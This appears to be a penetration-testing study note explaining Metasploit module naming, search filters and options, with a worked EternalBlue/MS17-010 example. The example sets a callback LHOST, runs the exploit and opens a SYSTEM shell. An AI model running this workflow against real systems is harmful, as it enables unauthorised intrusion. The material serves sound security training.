# Metasploit Modules

## Overview

Metasploit modules are prebuilt, purpose-specific components used to:

- enumerate services
- check for vulnerabilities
- exploit targets
- deliver payloads
- perform post-exploitation tasks

They are extremely useful, but they are **support tools**, not substitutes for manual skill.

Important point:

> If a Metasploit exploit fails, that does **not** prove the target is not vulnerable. It only proves that the Metasploit module did not work in that situation.

Some exploits require:

- target-specific tuning
- manual offsets
- alternate payloads
- different timing
- environmental adjustments

---

# 1. Module Syntax

General format:

```text
<no.> <type>/<os>/<service>/<name>
```

Example:

```text
794 exploit/windows/ftp/scriptftp_list
```

Breakdown:

| Part | Meaning |
|------|---------|
| `794` | search result index |
| `exploit` | module type |
| `windows` | target platform |
| `ftp` | target service |
| `scriptftp_list` | module name / action |

---

# 2. Module Types

The first part of a module path tells you what the module does.

| Type | Description |
|------|-------------|
| auxiliary | scanning, fuzzing, sniffing, admin tasks |
| encoders | transform payloads |
| exploits | exploit a vulnerability and deliver payload |
| nops | no-operation padding |
| payloads | code executed on target |
| plugins | add extra console functionality |
| post | post-exploitation modules |

---

## Commonly Interactable Module Types

These are the main module types you will directly `use` during an engagement:

| Type | Typical Use |
|------|-------------|
| auxiliary | scanning / enum / validation |
| exploit | exploitation |
| post | post-exploitation actions |

---

# 3. OS Tag

The OS portion indicates the intended target platform.

Examples:

```text
windows
linux
multi
unix
osx
android
```

Why it matters:

- payload compatibility
- exploit logic
- architecture selection
- available post modules

---

# 4. Service Tag

The service portion refers to the target protocol, application, or activity area.

Examples:

```text
smb
ftp
http
mysql
ssh
gather
local
scanner
```

For some modules, this can be a function rather than a protocol.

Example:

```text
post/windows/gather/hashdump
```

Here, `gather` refers to a category of post-exploitation activity.

---

# 5. Name Tag

The final portion describes the specific action or exploit.

Examples:

```text
ms17_010_psexec
scriptftp_list
smb_ms17_010
hashdump
```

This usually identifies:

- exploit family
- vulnerability ID
- feature abuse
- tool or technique used

---

# 6. Searching for Modules

Metasploit has a powerful search function.

## Search Help

```bash
help search
```

---

## Basic Search

```bash
search ms17_010
```

---

## Search by Type

```bash
search eternalromance type:exploit
```

---

## Search by Multiple Filters

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

---

## Useful Search Filters

| Filter | Example | Meaning |
|--------|---------|---------|
| `type` | `type:exploit` | module type |
| `platform` | `platform:windows` | target OS |
| `cve` | `cve:2021` | CVE year / ID |
| `rank` | `rank:excellent` | exploit reliability |
| `check` | `check:yes` | supports vulnerability check |
| `port` | `port:445` | relevant port |
| `name` | `name:exchange` | module name text |
| `author` | `author:rapid7` | module author |

---

## Sorting Search Results

Sort by name:

```bash
search ms17_010 -s name
```

Reverse order:

```bash
search type:exploit -s type -r
```

---

# 7. Example Search Results

Example:

```bash
search ms17_010
```

Possible results:

```text
0  exploit/windows/smb/ms17_010_eternalblue
1  exploit/windows/smb/ms17_010_psexec
2  auxiliary/admin/smb/ms17_010_command
3  auxiliary/scanner/smb/smb_ms17_010
```

Interpretation:

| Result | Purpose |
|--------|---------|
| `exploit/windows/smb/ms17_010_eternalblue` | exploit SMB vulnerability |
| `exploit/windows/smb/ms17_010_psexec` | exploit + code execution |
| `auxiliary/admin/smb/ms17_010_command` | command execution helper |
| `auxiliary/scanner/smb/smb_ms17_010` | vulnerability detection |

---

# 8. Selecting a Module

Use the result number:

```bash
use 0
```

Or full path:

```bash
use exploit/windows/smb/ms17_010_psexec
```

Using the index is faster during exams.

---

# 9. Viewing Module Options

After selecting a module:

```bash
options
```

This shows:

- required settings
- optional settings
- payload options
- target options

Anything with **Required = yes** must be configured before execution.

---

## Common Important Options

| Option | Purpose |
|--------|---------|
| `RHOSTS` | target IP(s) |
| `RPORT` | target port |
| `LHOST` | callback IP |
| `LPORT` | callback port |
| `SMBUser` | SMB username |
| `SMBPass` | SMB password |
| `SHARE` | SMB share used |
| `TARGET` | selected exploit target |

---

# 10. Viewing Module Details

Use:

```bash
info
```

This displays:

- module description
- authors
- references
- targets
- payload info
- vulnerability details
- rank
- whether `check` is supported

---

## Why `info` Matters

Before running an exploit, `info` can tell you:

- whether your target OS is supported
- whether the exploit is reliable
- if a named pipe or credentials are required
- whether you should expect Meterpreter or command shell
- what vulnerability family is being used

---

# 11. Example Workflow — MS17-010

## Step 1 — Enumerate Target

```bash
nmap -sV 10.10.10.40
```

Result shows:

- SMB open on 445
- Windows target
- likely vulnerable version

---

## Step 2 — Search Module

```bash
search ms17_010
```

---

## Step 3 — Select Module

```bash
use exploit/windows/smb/ms17_010_psexec
```

or

```bash
use 0
```

---

## Step 4 — Review Options

```bash
options
```

---

## Step 5 — View Info

```bash
info
```

---

## Step 6 — Set Target

```bash
set RHOSTS 10.10.10.40
```

---

## Step 7 — Set Global Target

```bash
setg RHOSTS 10.10.10.40
```

Useful when working repeatedly against same host.

---

## Step 8 — Set Callback Address

```bash
setg LHOST 10.10.14.15
```

---

## Step 9 — Run Exploit

```bash
run
```

or

```bash
exploit
```

---

# 12. `set` vs `setg`

## `set`
Applies option to current module only.

```bash
set RHOSTS 10.10.10.40
```

## `setg`
Sets a global option across modules until changed or console restarted.

```bash
setg LHOST 10.10.14.15
setg RHOSTS 10.10.10.40
```

Very useful in labs and exams.

---

# 13. Exploit Output Interpretation

Example successful output may include:

- reverse handler started
- vulnerability check passed
- connection established
- payload delivered
- session opened

Key success indicator:

```text
Command shell session 1 opened
```

or

```text
Meterpreter session 1 opened
```

---

# 14. Interacting with the Target

If Meterpreter opens:

```bash
meterpreter > shell
```

Then interact with native shell:

```cmd
C:\Windows\system32> whoami
nt authority\system
```

---

# 15. Practical Notes

- always enumerate before searching for modules
- match module to real service/version evidence
- use `info` before running exploit
- use `check` if supported
- exploit failure does not prove target is patched
- understand the exploit path, not just the command syntax

---

# Cheatsheet

## Search

```bash
search ms17_010
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## Select

```bash
use 0
use exploit/windows/smb/ms17_010_psexec
```

## Inspect

```bash
options
info
show targets
show payloads
```

## Configure

```bash
set RHOSTS 10.10.10.40
setg RHOSTS 10.10.10.40
setg LHOST 10.10.14.15
```

## Execute

```bash
run
exploit
```

## Interact

```bash
sessions
sessions -i 1
meterpreter > shell
```

---

# Related Notes

- Metasploit overview
- payload selection
- Meterpreter basics
- auxiliary modules
- exploit workflow
- multi/handler

---

# Tags

#metasploit #modules #msfconsole #enumeration #exploitation #meterpreter #oscp